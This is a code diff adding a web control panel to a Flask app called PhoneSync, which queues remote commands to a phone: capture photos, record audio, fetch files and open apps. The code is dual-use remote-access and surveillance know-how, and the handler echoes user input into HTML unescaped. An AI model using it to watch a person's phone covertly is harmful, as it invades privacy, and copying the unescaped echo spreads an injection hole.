@@ -225,6 +225,81 @@ def mobile_files_view():
     </html>
     """
     return html
+
+@app.route("/control")
+def control():
+
+    return """
+    <html>
+    <body>
+
+    <h2>PhoneSync Control Panel</h2>
+
+    <form action="/send_command_ui" method="post">
+        <button name="command" value="photo_request">
+            Capture Photo
+        </button>
+    </form>
+
+    <br>
+
+    <form action="/send_command_ui" method="post">
+        <button name="command" value="start_audio">
+            Start Audio
+        </button>
+    </form>
+
+    <br>
+
+    <form action="/send_command_ui" method="post">
+        <button name="command" value="stop_audio">
+            Stop Audio
+        </button>
+    </form>
+
+    <br>
+
+    <form action="/send_command_ui" method="post">
+        <button name="command" value="get_files">
+            Get Files
+        </button>
+    </form>
+
+    <br>
+
+    <form action="/send_command_ui" method="post">
+        <button name="command" value="open_chrome">
+            Open Chrome
+        </button>
+    </form>
+
+    <br>
+
+    <form action="/send_command_ui" method="post">
+        <button name="command" value="open_youtube">
+            Open YouTube
+        </button>
+    </form>
+
+    <br>
+
+    <form action="/send_command_ui" method="post">
+        <button name="command" value="open_instagram">
+            Open Instagram
+        </button>
+    </form>
+
+    <br>
+
+    <form action="/send_command_ui" method="post">
+        <button name="command" value="open_whatsapp">
+            Open WhatsApp
+        </button>
+    </form>
+
+    </body>
+    </html>
+    """
 @app.route("/request_file", methods=["POST"])
 def request_file():
 
@@ -268,7 +343,27 @@ def request_mobile_file():
         Back
     </a>
     """
+@app.route("/send_command_ui", methods=["POST"])
+def send_command_ui():
 
+    command = request.form.get("command")
+
+    conn = sqlite3.connect("database.db")
+    cursor = conn.cursor()
+
+    cursor.execute(
+        "INSERT INTO commands (command) VALUES (?)",
+        (command,)
+    )
+
+    conn.commit()
+    conn.close()
+
+    return f"""
+    <h3>Command Sent</h3>
+    <p>{command}</p>
+    <a href="/control">Back</a>
+    """
 @app.route("/send_command", methods=["POST"])
 def send_command():
 
